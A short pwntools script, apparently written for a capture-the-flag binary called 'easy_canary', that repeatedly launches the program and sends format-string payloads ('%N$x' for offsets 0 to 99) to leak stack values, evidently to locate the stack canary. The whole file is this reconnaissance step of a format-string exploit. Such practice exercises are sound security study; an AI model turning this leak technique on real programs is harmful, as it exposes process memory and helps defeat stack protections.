from pwn import *

elf=context.binary=ELF('./easy_canary', checksec=False)

for i in range (100):
    try:
        p=process(level='error')
        s=p.recvline()
        p.sendline(b"1")
        p.recvline()
        
        p.sendlineafter('!','%{}$x'.format(i).encode())
        p.recvline()
        result = p.recvline().decode()
        if result:
            print(str(i) + ': ' + str(result).strip())
        p.close()
    except EOFError:
        pass
